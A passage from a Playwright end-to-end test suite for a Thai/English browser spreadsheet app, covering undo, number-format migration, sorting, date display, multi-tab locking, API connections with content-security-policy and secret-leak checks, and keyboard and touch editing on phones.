      const focused = await page.evaluate(() => document.activeElement?.textContent?.trim() ?? "");
      note(focused === "ส่งออก Excel ก่อน", `New file asks over work, with export first under the cursor ("${focused}")`);
      await dialog.getByRole("button", { name: "เริ่มไฟล์ใหม่", exact: true }).click();
      note((await text(1, 2)) === "" && (await text(0, 0)) === "", "confirming leaves one empty sheet");

      await cell(page, 0, 0).click();
      await page.keyboard.press("Control+z");
      await page.waitForFunction(() => document.querySelector('td[data-row="1"][data-col="2"]')?.innerText.trim() === "70", null, { timeout: 5000 }).catch(() => {});
      note((await text(1, 2)) === "70", `Ctrl+Z brings the work back (C2 "${await text(1, 2)}")`);
    },
  },
  {
    // #53: Percent is Excel's now (×100). What a unit test cannot reach is the store's migration
    // running on a real autosave: a cell saved as "50, Percent" by the version before must still read
    // 50.00%, not 5000%, while choosing Percent now gives Excel's.
    name: "a percent saved before #53 still reads the same, and Percent is Excel's now",
    // 1440: from 1366 the number format menu sits in the row rather than in the tools panel.
    width: 1440,
    async run(page) {
      await page.evaluate(() => {
        const sheet = { rows: 30, cols: 10, cells: { "0,0": "50", "1,0": "0.25" }, formats: { "0,0": { numberFormat: "percent" } } };
        localStorage.setItem("exceltogo-sheet-v2", JSON.stringify({ state: { sheets: [{ id: "old", name: "Sheet1", sheet }], activeSheetId: "old" }, version: 0 }));
      });
      await page.reload({ waitUntil: "networkidle" });
      const a1 = (await cell(page, 0, 0).innerText()).trim();
      note(a1 === "50.00%", `the old save's 50 in Percent still reads 50.00% (A1 "${a1}")`);

      await cell(page, 1, 0).click();
      await page.getByRole("combobox", { name: "รูปแบบตัวเลข" }).first().selectOption("percent");
      const a2 = (await cell(page, 1, 0).innerText()).trim();
      note(a2 === "25.00%", `0.25 given Percent now reads 25.00%, as in Excel (A2 "${a2}")`);
    },
  },
  {
    // #48: on the sample every visitor sees, sorting used to leave 8 of 9 totals reading another
    // row's price and quantity while the grand total still added up. Driven through the real
    // buttons in both languages; then a sort that cannot keep its formulas right has to ask first.
    name: "sorting the sample keeps every row's total its own, and a risky sort asks first",
    width: 1440,
    async run(page) {
      const num = async (r, c) => Number((await cell(page, r, c).innerText()).replace(/[^\d.-]/g, ""));
      for (const lang of ["th", "en"]) {
        await page.evaluate((l) => {
          localStorage.clear();
          localStorage.setItem("exceltogo-locale", JSON.stringify({ state: { locale: l }, version: 0 }));
        }, lang);
        await page.reload({ waitUntil: "networkidle" });
        await page.getByRole("button", { name: lang === "th" ? "ลองกับข้อมูลตัวอย่าง" : "Try it with sample data", exact: true }).click();
        await cell(page, 1, 2).click();
        await page.getByTitle(lang === "th" ? "เรียงจากมากไปน้อย (Z-A, 9-0)" : "Sort descending (Z-A, 9-0)").click();
        let wrong = 0;
        for (let r = 1; r <= 9; r++) if ((await num(r, 2)) * (await num(r, 3)) !== (await num(r, 4))) wrong++;
        const prices = [];
        for (let r = 1; r <= 9; r++) prices.push(await num(r, 2));
        const sorted = prices.every((p, i) => i === 0 || prices[i - 1] >= p);
        note(sorted && wrong === 0, `${lang}: sorted by price, every row's total is its own price × quantity (${wrong} wrong)`);
        note((await num(11, 4)) === 7495, `${lang}: the grand total is unchanged (${await num(11, 4)})`);
      }

      // The grand total caught in the range: the sort asks, Cancel has focus, and Escape changes nothing.
      const before = (await cell(page, 1, 0).innerText()).trim();
      await cell(page, 0, 0).click();
      await cell(page, 11, 4).click({ modifiers: ["Shift"] });
      await page.getByTitle("Sort ascending (A-Z, 0-9)").click();
      const dialog = page.getByRole("alertdialog");
      await dialog.waitFor({ timeout: 5000 });
      const focused = await page.evaluate(() => document.activeElement?.textContent?.trim());
      note(focused === "Cancel", `a sort over the grand total asks first, with Cancel focused ("${focused}")`);
      await page.keyboard.press("Escape");
      const after = (await cell(page, 1, 0).innerText()).trim();
      note(!(await dialog.isVisible()) && after === before, `Escape leaves the sheet as it was (A2 "${after}")`);
    },
  },
  ...[1280, 390].map((width) => ({
    // #136: a file whose date columns are Excel's default width shows its dates, because Excel does.
    // The grid's font is wider than Calibri, so the date is drawn smaller in its cell; the column
    // keeps the file's width, and `###` stays for a column Excel cannot fit the date in either.
    name: `dates in Excel's default column width show as dates, not ### (${width}px)`,
    width,
    touch: width < 640,
    async run(page, { tmp }) {
      const { default: ExcelJS } = await import("exceljs");
      const wb = new ExcelJS.Workbook();
      const ws = wb.addWorksheet("Sheet1");
      const when = new Date(Date.UTC(2026, 8, 28, 14, 30));
      [["B", "dd/mm/yyyy"], ["C", "yyyy-mm-dd"], ["D", "hh:mm"], ["E", "dd/mm/yyyy"]].forEach(([col, fmt]) => {
        ws.getColumn(col).numFmt = fmt;
        ws.getCell(`${col}1`).value = fmt;
        ws.getCell(`${col}2`).value = when;
      });
      ws.getColumn("E").width = 5; // 40px: narrower than Calibri's 68px for this date
      const file = join(tmp, `dates-${width}.xlsx`);
      await wb.xlsx.writeFile(file);
      await page.locator('input[type="file"]').setInputFiles(file);
      await page.waitForFunction(() => /2026/.test(document.querySelector('td[data-row="1"][data-col="2"]')?.textContent ?? ""));
      // As a person sees it: once the page's font is in. The grid fits dates in that font, and has
      // to fit them again when it arrives — on CI it arrives after the file does.
      await page.evaluate(() => document.fonts.ready);
      await page.waitForTimeout(200);

      for (const [col, want] of [[1, "28/09/2026"], [2, "2026-09-28"]]) {
        const seen = await cell(page, 1, col).evaluate((td) => {
          const span = td.querySelector("span");
          return { text: td.innerText.trim(), whole: span.scrollWidth <= span.clientWidth, width: td.offsetWidth, drawn: `${span.scrollWidth}/${span.clientWidth}px at ${span.style.fontSize || "full size"}` };
        });
        note(seen.text === want && seen.whole, `${want} shows whole in its ${seen.width}px column (showed "${seen.text}", ${seen.drawn})`);
      }
      const narrow = await cell(page, 1, 4).evaluate((td) => ({ text: td.querySelector("span [aria-hidden]")?.textContent, title: td.title }));
      note(narrow.text === "###" && narrow.title.includes("28/09/2026"), `a 40px column is still ### with the date in its tooltip ("${narrow.title}")`);

      if (width >= 640) {
        const [download] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: label.exportExcel }).click()]);
        const out = join(tmp, `dates-${width}-out.xlsx`);
        await download.saveAs(out);
        const back = new ExcelJS.Workbook();
        await back.xlsx.readFile(out);
        const widths = ["B", "C", "E"].map((col) => Math.round(back.worksheets[0].getColumn(col).width * 100) / 100);
        note(widths.join() === "9,9,5", `export keeps the file's column widths (B, C, E: ${widths.join(", ")})`);
      }
    },
  })),
  {
    // #47: two tabs on one workbook used to save over each other in silence. Now the second one
    // asks, and taking over turns the first view-only — with a cell still being typed in the first
    // tab committed and saved on the way, so nothing either tab did is lost.
    name: "a second tab asks first, taking over turns the first view-only, and no edit is lost",
    async run(page) {
      await typeInCell(page, 0, 0, "first-tab");
      await cell(page, 1, 0).click();
      await page.keyboard.type("half-typed"); // the editor is still open when the other tab takes over

      const second = await page.context().newPage();
      await second.goto(ORIGIN + "/app", { waitUntil: "networkidle" });
      const ask = second.getByRole("alertdialog", { name: /^(ไฟล์นี้เปิดอยู่ในอีกแท็บ|This workbook is open in another tab)$/ });
      await ask.waitFor({ timeout: 5000 });
      note(true, "the second tab says the workbook is open in another tab");
      const focused = await second.evaluate(() => document.activeElement?.textContent?.trim());
      note(/^(ดูอย่างเดียว|View only)$/.test(focused ?? ""), `"View only", which changes nothing anywhere, has the focus ("${focused}")`);

      await ask.getByRole("button", { name: label.useHere }).click();
      await page.getByRole("status").filter({ hasText: /แท็บนี้ดูอย่างเดียวแล้ว|This tab is view-only now/ }).waitFor({ timeout: 5000 });
      note(true, "the first tab says it is view-only now");

      await second.waitForFunction(() => document.querySelector('td[data-row="1"][data-col="0"]')?.innerText.trim() === "half-typed", null, { timeout: 5000 }).catch(() => {});
      const got = await Promise.all([0, 1].map(async (r) => (await cell(second, r, 0).innerText()).trim()));
      note(got.join() === "first-tab,half-typed", `the tab taking over has both edits, the half-typed one too (${got.join(", ")})`);

      await typeInCell(page, 2, 0, "typed-in-first");
      const refused = (await cell(page, 2, 0).innerText()).trim();
      const said = await page.getByRole("status").filter({ hasText: /แก้ในแท็บนี้ไม่ได้|Nothing can be changed in this tab/ }).count();
      note(refused === "" && said === 1, `typing in the view-only tab changes nothing and says why (A3 "${refused}")`);

      await typeInCell(second, 2, 0, "typed-in-second");
      await page.waitForFunction(() => document.querySelector('td[data-row="2"][data-col="0"]')?.innerText.trim() === "typed-in-second", null, { timeout: 5000 }).catch(() => {});
      const mirrored = (await cell(page, 2, 0).innerText()).trim();
      note(mirrored === "typed-in-second", `the view-only tab shows what the other tab saves (A3 "${mirrored}")`);

      // Nobody is editing once the second tab closes, so a third one simply edits.
      await second.close();
      const third = await page.context().newPage();
      await third.goto(ORIGIN + "/app", { waitUntil: "networkidle" });
      const kept = await Promise.all([0, 1, 2].map(async (r) => (await cell(third, r, 0).innerText()).trim()));
      note(kept.join() === "first-tab,half-typed,typed-in-second", `reopened, the workbook has every edit from both tabs (${kept.join(", ")})`);
      await third.close();
    },
  },
  {
    // A Thai sheet name has to arrive as a Thai file name. It also guards this gate: Chromium under
    // a POSIX locale names such a file "download", which is how QA's round 2 filed a bug that was
    // not there. Should the browser ever launch without browserEnv() again, this goes red.
    name: "a Thai sheet name downloads as a Thai file name",
    width: 1440,
    async run(page) {
      await typeInCell(page, 0, 0, "1");
      await page.getByText("Sheet1", { exact: true }).first().dblclick();
      await page.keyboard.press("Control+a");
      await page.keyboard.insertText("ยอดขาย");
      await page.keyboard.press("Enter");
      const [download] = await Promise.all([page.waitForEvent("download"), page.getByRole("button", { name: "ส่งออก CSV" }).click()]);
      const name = download.suggestedFilename();
      note(name === "ยอดขาย.csv", `the CSV is named after the sheet ("${name}")`);
    },
  },
  {
    // #110: the visitor's own API, fetched by the visitor's browser. Every request the page makes is
    // recorded, because the promise is not only "it works" but "nothing about it reaches us".
    name: "an API connected from this browser fills the sheet and refreshes, and nothing about it reaches /api/*",
    async run(page) {
      const toApp = [];
      page.on("request", (r) => {
        if (new URL(r.url()).origin === ORIGIN && new URL(r.url()).pathname.startsWith("/api/")) {
          toApp.push(`${r.method()} ${r.url()} ${JSON.stringify(r.headers())} ${r.postData() ?? ""}`);
        }
      });
      const first = (await page.goto(ORIGIN + "/app", { waitUntil: "networkidle" }))?.headers()["content-security-policy"] ?? "";
      note(connectSrcOf(first) === BASE_CONNECT_SRC, `before any source, connect-src is exactly the old one (${connectSrcOf(first)})`);

      await page.getByRole("button", { name: label.liveData }).first().click();
      await page.getByRole("button", { name: label.connectYourApi }).click();
      const form = page.getByRole("dialog");
      await form.getByRole("textbox").first().fill("Stock");
      await form.getByPlaceholder("https://erp.example.com/api/items").fill(`${API}/stock`);
      await form.getByLabel(/^(ชื่อ header|Header name)$/).fill("Authorization");
      await form.getByLabel(/^(ค่า \(เช่น Bearer xxx\)|Value \(e\.g\. Bearer xxx\))$/).fill(API_SECRET);
      await form.getByPlaceholder("data.items").fill("data");
      await form.locator('input[type="number"]').nth(1).fill("5");

      // A new origin costs one reload, which the button says before it is pressed.
      const reloadedDoc = page.waitForResponse((r) => r.url() === ORIGIN + "/app" && r.request().resourceType() === "document");
      await form.getByRole("button", { name: label.allowAndTest }).click();
      const response = await reloadedDoc;
      const after = connectSrcOf(response.headers()["content-security-policy"] ?? "");
      note(after === `${BASE_CONNECT_SRC} ${API}`, `after allowing it, connect-src has that one origin added and nothing else (${after})`);

      await page.getByRole("dialog").getByText(/ได้ข้อมูล 2 แถว|Got 2 rows/).waitFor({ timeout: 15_000 });
      note(true, "the form came back after the reload and the test ran: 2 rows");
      await page.getByRole("dialog").getByRole("button", { name: label.saveAndAdd }).click();
      const picker = page.getByRole("dialog");
      await picker.getByRole("button", { name: label.wholeTable }).click();
      await picker.getByRole("textbox").fill("G1");
      await picker.getByRole("button", { name: label.insert }).click();
      await page.waitForFunction(() => document.querySelector('td[data-row="1"][data-col="6"]')?.innerText.trim() === "RICE-5KG", null, { timeout: 15_000 });
      const qty = () => cell(page, 1, 7).innerText();
      const was = Number(await qty());
      await page.waitForFunction((n) => Number(document.querySelector('td[data-row="1"][data-col="7"]')?.innerText) > n, was, { timeout: 20_000 });
      note(true, `the rows are in the sheet at G1 and refresh on their own (${was} → ${await qty()})`);

      const stored = await page.evaluate(() => ({
        local: Object.keys(localStorage).map((k) => localStorage.getItem(k) ?? "").join("\n"),
        session: Object.keys(sessionStorage).filter((k) => (sessionStorage.getItem(k) ?? "").includes("e2e-secret")),
      }));
      note(!stored.local.includes("e2e-secret"), "the header value is not in localStorage");
      note(stored.session.length === 1 && stored.session[0].startsWith("etg-source-header:"), `it is in sessionStorage under the source's id (${stored.session.join(", ")})`);

      const leaked = toApp.filter((r) => r.includes(String(API_PORT)) || r.includes("e2e-secret") || r.includes("RICE-5KG"));
      note(leaked.length === 0, `no request to /api/* carries the URL, the header or the data (${toApp.length} request(s) to /api/* in all)`, leaked.join(" | "));

      // #115: a second tab has the source but not the header value, which lives in the first tab's
      // sessionStorage. That is waiting on the person, and the card has to say so — not "connection
      // failed" beside "loading…", which is what it used to say.
      const tab = await page.context().newPage();
      await tab.goto(ORIGIN + "/app", { waitUntil: "networkidle" });
      // The first tab is still open, so this one asks first (#47); working here means taking over.
      await tab.getByRole("alertdialog").getByRole("button", { name: label.useHere }).click();
      await tab.getByRole("button", { name: label.liveData }).first().click();
      const card = tab.locator("div.relative.rounded-lg").filter({ hasText: "Stock" });
      await card.getByRole("button", { name: label.enterSecret }).waitFor({ timeout: 15_000 });
      const said = await card.innerText();
      note(/รอค่า header|Waiting for header/.test(said), "a reopened tab says it is waiting for the header value");
      note(!/เชื่อมต่อไม่ได้|Connection failed/.test(said) && !/กำลังโหลด|Loading/.test(said), `and says neither "connection failed" nor "loading" (${said.replace(/\s+/g, " ").slice(0, 120)})`);
      await card.getByRole("button", { name: label.enterSecret }).click();
      const again = tab.getByRole("dialog");
      await again.getByLabel(/^(ค่า \(เช่น Bearer xxx\)|Value \(e\.g\. Bearer xxx\))$/).fill(API_SECRET);
      await again.getByRole("button", { name: label.saveAndAdd }).click();
      await card.getByText(/^(สด|Live)$/).waitFor({ timeout: 15_000 });
      note(true, "once the value is entered, the card is live again");
      await tab.close();
    },
  },
  {
    name: "an API that does not answer CORS gets a checklist for IT, not a bare error",
    async run(page) {
      await page.context().addCookies([{ name: "etg-api-origins", value: encodeURIComponent(API), url: ORIGIN, sameSite: "Strict", secure: true }]);
      await page.reload({ waitUntil: "networkidle" });
      await page.getByRole("button", { name: label.liveData }).first().click();
      await page.getByRole("button", { name: label.connectYourApi }).click();
      const form = page.getByRole("dialog");
      await form.getByRole("textbox").first().fill("No CORS");
      await form.getByPlaceholder("https://erp.example.com/api/items").fill(`${API}/nocors`);
      await form.getByRole("button", { name: label.test }).click();
      await form.getByRole("button", { name: label.copyForIt }).waitFor({ timeout: 15_000 });
      const text = await form.innerText();
      note(text.includes("Access-Control-Allow-Origin: " + ORIGIN), "the checklist names the header IT has to send, with this site's own origin");
      note(/VPN/.test(text), "and asks about the VPN first");
    },
  },
  {
    // The sample APIs: not added for anyone, but one press from a filled-in form. They live on this
    // site, which `'self'` already covers, so trying one costs no reload and leaves the policy alone.
    name: "a sample API goes through the same form, with no reload and no change to the policy",
    async run(page) {
      await page.getByRole("button", { name: label.liveData }).first().click();
      await page.getByRole("button", { name: label.trySales }).click();
      const form = page.getByRole("dialog");
      const url = await form.getByPlaceholder("https://erp.example.com/api/items").inputValue();
      note(url === ORIGIN + "/api/sample/sales", `the form is filled in with the sample's URL on this site (${url})`);
      const test = form.getByRole("button", { name: label.test });
      note(await test.isVisible(), "and its button just says Test — a sample needs no reload");
      await test.click();
      await form.getByText(/ได้ข้อมูล 5 แถว|Got 5 rows/).waitFor({ timeout: 15_000 });
      await form.getByRole("button", { name: label.saveAndAdd }).click();
      const picker = page.getByRole("dialog");
      await picker.getByRole("button", { name: label.wholeTable }).click();
      await picker.getByRole("textbox").fill("G1");
      await picker.getByRole("button", { name: label.insert }).click();
      await page.waitForFunction(() => document.querySelector('td[data-row="1"][data-col="6"]')?.innerText.trim() === "CF-01", null, { timeout: 15_000 });
      note(true, "its rows are in the sheet at G1");
      const cookie = (await page.context().cookies()).find((c) => c.name === "etg-api-origins");
      note(!cookie || !decodeURIComponent(cookie.value).includes(ORIGIN), "this site's own origin is not added to the cookie");
      const header = (await page.goto(ORIGIN + "/app"))?.headers()["content-security-policy"] ?? "";
      note(connectSrcOf(header) === BASE_CONNECT_SRC, `and connect-src is still exactly the old one (${connectSrcOf(header)})`);
      // The panel may already be open after the reload; the tab toggles, so press it only if not.
      const sample = page.getByRole("button", { name: label.trySales });
      if (!(await sample.isVisible().catch(() => false))) await page.getByRole("button", { name: label.liveData }).first().click();
      note(await sample.isDisabled(), "the sample now shows as added instead of inviting a duplicate");

      // #122: the picker closes on Escape and gives focus back to the button that opened it.
      const insertButton = page.getByRole("button", { name: label.insert }).first();
      await insertButton.focus();
      await page.keyboard.press("Enter");
      await page.getByRole("dialog").waitFor({ timeout: 5000 });
      await page.keyboard.press("Escape");
      const closed = (await page.getByRole("dialog").count()) === 0;
      const back = await page.evaluate(() => document.activeElement?.textContent?.trim() ?? "");
      note(closed && /ใส่ลงตาราง|Insert/.test(back), `the picker closes on Escape and focus returns to its button ("${back}")`);
    },
  },
  {
    // #109: there is no demo. The word was on the guide, the panel and the landing page, and it
    // told people the real app was a trial.
    name: "no page calls itself a demo, in either language",
    async run(page) {
      for (const lang of ["th", "en"]) {
        await page.evaluate((l) => localStorage.setItem("exceltogo-locale", JSON.stringify({ state: { locale: l }, version: 0 })), lang);
        for (const route of ["/", "/app", "/guide"]) {
          await page.goto(ORIGIN + route, { waitUntil: "networkidle" });
          if (route === "/app") {
            await page.getByRole("button", { name: label.liveData }).first().click();
            await page.locator("aside h2", { hasText: /ข้อมูลสด|Live data/ }).waitFor({ timeout: 5000 });
          }
          const text = await page.evaluate(() => document.body.innerText);
          const hit = text.match(/.{0,30}(เดโม|demo).{0,30}/i)?.[0];
          note(!hit, `${lang} ${route}: no "demo" in the visible text`, hit);
        }
      }
    },
  },
  {
    // Typing a table the Excel way: Tab across a row, Enter at its end, and the cursor is back under
    // the first column. `tabReturn.test.ts` covers the arithmetic; this asks whether both key paths
    // — a cell being edited and a cell only selected — actually go through it.
    name: "a row typed with Tab ends with Enter under its first column, and the cell menu opens from the keyboard",
    async run(page) {
      // #102's own test: three rows of four, typed with Tab and Enter only, come out a rectangle.
      await cell(page, 2, 1).click();
      for (const r of [1, 2, 3]) {
        for (const c of ["a", "b", "c"]) {
          await page.keyboard.type(`${c}${r}`);
          await page.keyboard.press("Tab");
        }
        await page.keyboard.type(`d${r}`);
        await page.keyboard.press("Enter");
      }
      const grid = await page.evaluate(() =>
        [2, 3, 4].map((r) => [1, 2, 3, 4].map((c) => document.querySelector(`td[data-row="${r}"][data-col="${c}"]`)?.innerText.trim()).join(","))
      );
      note(
        grid.join(" | ") === "a1,b1,c1,d1 | a2,b2,c2,d2 | a3,b3,c3,d3",
        `3 rows × 4 columns by Tab…Enter land as a rectangle, not a staircase (${grid.join(" | ")})`
      );

      // Past the last column the sheet is drawn on to the edge of the screen, and a click there grows
      // it — a blank sheet used to stop at J with a blank band beside it. The formula panel is put
      // away first so a 1280px screen has room past J.
      const palette = page.getByRole("button", { name: /^(สูตร|Formulas)$/ });
      if ((await palette.getAttribute("aria-pressed")) === "true") await palette.click();
      const ghostCol = Number(await page.locator("td[data-ghost-col]").first().getAttribute("data-ghost-col"));
      await page.locator(`td[data-ghost-col="${ghostCol}"]`).nth(1).click();
      await page.keyboard.type("k");
      await page.keyboard.press("Enter");
      const grownInto = (await cell(page, 1, ghostCol).innerText()).trim();
      note(grownInto === "k", `a click on a column drawn past the last one grows the sheet into it (${ghostCol}: "${grownInto}")`);

      // Tab at the last column used to stay put, so the next value typed over the one just entered.
      const lastCol = await page.evaluate(() => Math.max(...[...document.querySelectorAll("thead th[aria-colindex]")].map((th) => Number(th.getAttribute("aria-colindex")))) - 2);
      await cell(page, 8, lastCol).click();
      await page.keyboard.type("edge");
      await page.keyboard.press("Tab");
      await page.keyboard.type("past");
      await page.keyboard.press("Enter");
      const edge = (await cell(page, 8, lastCol).innerText()).trim();
      const past = (await cell(page, 8, lastCol + 1).innerText()).trim();
      note(edge === "edge" && past === "past", `Tab at the last column grows the sheet instead of typing over it ("${edge}" then "${past}")`);

      // A toolbar button no longer keeps focus: Bold, then an arrow, and the cursor moves.
      await cell(page, 5, 1).click();
      await page.getByRole("button", { name: /^(ตัวหนา|Bold)$/ }).click();
      await page.keyboard.press("ArrowDown");
      const at = await page.evaluate(() => document.activeElement?.closest("td")?.getAttribute("data-row"));
      note(at === "6", `after pressing Bold the arrow keys still move the cursor (focus on row ${at})`);

      // Shift+F10: the menu a mouse gets on right-click, for a keyboard. Copy from it, paste from it.
      await cell(page, 2, 1).click();
      await page.keyboard.press("Shift+F10");
      const menu = page.getByRole("menu");
      await menu.waitFor({ timeout: 5000 });
      note(await page.evaluate(() => document.activeElement?.getAttribute("role") === "menuitem"), "the menu takes focus on its first item");
      await menu.getByRole("menuitem", { name: /คัดลอก|Copy/ }).click();
      await cell(page, 6, 4).click({ button: "right" });
      await page.getByRole("menu").getByRole("menuitem", { name: /วาง|Paste/ }).click();
      const pasted = (await cell(page, 6, 4).innerText()).trim();
      note(pasted === "a1", `copy and paste from the menu work (E7 showed "${pasted}")`);
    },
  },
  {
    // The model has carried column widths since imports kept them; the drag is new. What a unit test
    // cannot see is the handle: that it sits on the header edge, that dragging it does not select
    // the column underneath, and that the whole drag is one undo step rather than one per pixel.
    name: "a column dragged wider stays wider, and one undo puts it back",
    async run(page) {
      const header = page.locator('thead th[aria-colindex="3"]');
      const before = (await header.boundingBox()).width;
      const grip = await page.locator('[data-col-resize="1"]').boundingBox();
      await page.mouse.move(grip.x + grip.width / 2, grip.y + grip.height / 2);
      await page.mouse.down();
      await page.mouse.move(grip.x + grip.width / 2 + 90, grip.y + grip.height / 2, { steps: 6 });
      await page.mouse.up();
      const after = (await header.boundingBox()).width;
      note(after - before > 60, `the column is wider after the drag (${Math.round(before)} → ${Math.round(after)}px)`);
      const selected = await page.evaluate(() => document.querySelectorAll('td[aria-selected="true"]').length);
      note(selected <= 1, `grabbing the edge did not select the column (${selected} cells selected)`);

      // Undo first: its history lives in memory, and a reload starts it over.
      await cell(page, 0, 0).click();
      await page.keyboard.press("Control+z");
      const undone = (await header.boundingBox()).width;
      note(Math.abs(undone - before) < 2, `one undo puts it back (${Math.round(undone)}px)`);
      await page.keyboard.press("Control+y");
      await page.reload({ waitUntil: "networkidle" });
      const kept = (await page.locator('thead th[aria-colindex="3"]').boundingBox()).width;
      note(Math.abs(kept - after) < 2, `redone, the width survives a reload (${Math.round(kept)}px)`);
    },
  },
  {
    // On a phone every Enter used to close the editor, and with it the keyboard: a column of ten
    // values was ten taps to reopen it. Only a browser can say what has focus after the key.
    name: "on a phone, Enter goes straight into the next cell's editor",
    width: 390,
    touch: true,
    async run(page) {
      await cell(page, 1, 1).tap();
      await cell(page, 1, 1).tap();
      await cell(page, 1, 1).locator("input").waitFor({ timeout: 5000 });
      await page.keyboard.insertText("one");
      await page.keyboard.press("Enter");
      await cell(page, 2, 1).locator("input").waitFor({ timeout: 5000 });
      const focused = await page.evaluate(() => document.activeElement?.closest("td")?.getAttribute("data-row"));
      note(focused === "2", `after Enter the editor on the next row has focus (row ${focused})`);
      await page.keyboard.insertText("two");
      await page.keyboard.press("Enter");
      const values = [(await cell(page, 1, 1).innerText()).trim(), (await cell(page, 2, 1).innerText()).trim()];
      note(values[0] === "one" && values[1] === "two", `both values landed without a tap in between (${values.join(", ")})`);
    },
  },
  {
    // #127 and the stopgap for #99, on a phone, where both were found. A drag pulled mostly down
    // with the thumb drifting right went C2:C11 → C2:J11 and took the data off screen; a row
    // header tap jumped the view to H–J; and `=` then a tap on another cell saved `=` over the cell.
    // All three are a finger meeting the grid's scroll and focus, which only a browser has.
    name: "on a phone, a drag stays in its column, the view stays put, and a tap during = saves nothing",
    width: 390,
    touch: true,
    async run(page) {
      const scroller = page.locator("[data-grid-scroller]");
      const scrollLeft = () => scroller.evaluate((el) => el.scrollLeft);
      const nameBox = () => page.locator("span.w-16").first().innerText();

      // By coordinates on the part of C2 that shows: a locator's tap scrolls the cell fully into
      // view first, which a finger never does, and that is the very case this is about.
      const c2 = await cell(page, 1, 2).boundingBox();
      await page.touchscreen.tap(c2.x + 30, c2.y + c2.height / 2);
      await page.waitForTimeout(100);
      const grip = await page.locator('[role="slider"]').first().boundingBox();
      const onGrip = await page.evaluate(([gx, gy]) => document.elementFromPoint(gx, gy)?.closest('[role="slider"]') !== null, [grip.x + grip.width / 2, grip.y + grip.height / 2]);
      note(onGrip, "the grip on the right-most visible column is fully on screen, so a finger can take it");
      const target = await cell(page, 10, 2).boundingBox();
      const cdp = await page.context().newCDPSession(page);
      const touch = (type, x, y) => cdp.send("Input.dispatchTouchEvent", { type, touchPoints: type === "touchEnd" ? [] : [{ x, y }] });
      let x = grip.x + grip.width / 2;
      let y = grip.y + grip.height / 2;
      const endY = target.y + target.height / 2;
      await touch("touchStart", x, y);
      // Down to C11, drifting right into the edge zone the way a thumb does, then held there.
      for (let i = 1; i <= 20; i++) {
        await touch("touchMove", x + i * 1.5, y + ((endY - y) * i) / 20);
        await page.waitForTimeout(16);
      }
      x += 30;
      await page.waitForTimeout(600);
      await touch("touchEnd", x, endY);
      await page.waitForTimeout(100);
      const range = (await nameBox()).trim();
      const colA = await cell(page, 10, 0).boundingBox();
      note(range === "C2:C11", `the drag selected C2:C11, not the columns beside it (${range})`);
      note(colA !== null && colA.x >= 0, `column A is still on screen after the drag (scrollLeft ${await scrollLeft()})`);

      const before = await scrollLeft();
      await page.locator('tbody th[scope="row"]').first().tap();
      await page.waitForTimeout(100);
      note((await scrollLeft()) === before, `a tap on row header 1 leaves the view where it was (${before} → ${await scrollLeft()})`);

      // The chip: the selection scrolled wholly off to the left comes back with one tap.
      await cell(page, 1, 2).tap();
      await scroller.evaluate((el) => el.scrollTo({ left: 900 }));
      const chip = page.getByRole("button", { name: /^(กลับไปที่|Back to) C2$/ });
      await chip.waitFor({ timeout: 3000 });
      await chip.tap();
      await page.waitForTimeout(100);
      const back = await cell(page, 1, 2).boundingBox();
      note(back !== null && back.x > 0 && back.x < 390, `the chip brings the selection back on screen (C2 at x ${back && Math.round(back.x)})`);

      // #99, both editors: a tap on another cell while the draft is `=` never saves the draft over
      // the cell. (Since the pointing bar the tap also puts the address in; the next flow checks that.)
      await cell(page, 3, 1).tap();
      await cell(page, 3, 1).tap();
      await cell(page, 3, 1).locator("input").waitFor({ timeout: 5000 });
      await page.keyboard.insertText("=");
      await cell(page, 5, 2).tap();
      await page.waitForTimeout(100);
      const stillEditing = await cell(page, 3, 1).locator("input").count();
      note(stillEditing === 1, "a tap on C6 while B4 holds `=` leaves B4's editor open");
      const pointedInto = await cell(page, 3, 1).locator("input").inputValue();
      note(pointedInto === "=C6", `and puts C6 into the formula (${pointedInto})`);
      await page.keyboard.press("Escape");
      note((await cell(page, 3, 1).innerText()).trim() === "", "and B4 was not written");

      await cell(page, 4, 1).tap();
      await cell(page, 4, 1).tap();
      await cell(page, 4, 1).locator("input").waitFor({ timeout: 5000 });
      await page.keyboard.insertText("keep");
      await page.keyboard.press("Enter");
      await cell(page, 4, 1).tap();
      const bar = page.getByPlaceholder(/SUM\(A1:A10\)/);
      await bar.tap();
      await bar.fill("=");
      await cell(page, 6, 2).tap();
      await page.waitForTimeout(100);
      note((await cell(page, 4, 1).innerText()).trim() === "keep", "`=` in the formula bar and a tap on C7: B5 still says keep");
      note((await nameBox()).trim() === "B5", "and the selection did not move to the tapped cell");
      await page.keyboard.press("Escape");
    },
  },
  {
    // #99 and #138: a formula built by tapping on a phone. The seams are all a finger's — a tap
    // that must not take focus from the editor, a grip that edits text instead of the selection,
    // a bar above a keyboard whose keys must not close it, and a form that has to get out of the
    // grid's way and come back with what was picked.
    name: "on a phone, tapped cells go into a formula, Done saves it closed, and ⌖ picks from the grid",
    width: 390,
    touch: true,
    async run(page) {
      const tapCell = async (r, c) => {
        const box = await cell(page, r, c).boundingBox();
        await page.touchscreen.tap(box.x + box.width / 2, box.y + box.height / 2);
        await page.waitForTimeout(120);
      };
      for (const [r, v] of [[1, "10"], [2, "20"], [3, "30"]]) {
        await tapCell(r, 1);
        await tapCell(r, 1);
        await cell(page, r, 1).locator("input").waitFor({ timeout: 5000 });
        await page.keyboard.insertText(v);
        await page.keyboard.press("Enter");
        await page.keyboard.press("Escape");
      }

      await tapCell(4, 1);
      await tapCell(4, 1);
      const editor = cell(page, 4, 1).locator("input");
      await editor.waitFor({ timeout: 5000 });
      await page.keyboard.insertText("=SUM(");
      const bar = page.getByRole("toolbar", { name: label.pointingKeys });
      await bar.waitFor({ timeout: 5000 });
      note(true, "typing = on a phone brings up the pointing bar");
      // Done ran off a 360px screen (PO's check of #144): the bar clips its own overflow, so nothing
      // scrolls sideways and no other gate sees it.
      for (const width of [360, 320]) {
        await page.setViewportSize({ width, height: 844 });
        await page.waitForTimeout(150);
        const outside = await bar.locator("button").evaluateAll((buttons) =>
          buttons.filter((b) => {
            const r = b.getBoundingClientRect();
            return r.left < 0 || r.right > window.innerWidth;
          }).length
        );
        note(outside === 0, `every button of the pointing bar is on screen at ${width}px (${outside} past the edge)`);
      }
      await page.setViewportSize({ width: 390, height: 900 });
      await page.waitForTimeout(150);
      await tapCell(1, 1);
      await tapCell(2, 1);
      note((await editor.inputValue()) === "=SUM(B3", `a second tap replaces the first address (${await editor.inputValue()})`);

      const grip = await page.locator('[role="slider"]').first().boundingBox();
      const to = await cell(page, 3, 1).boundingBox();
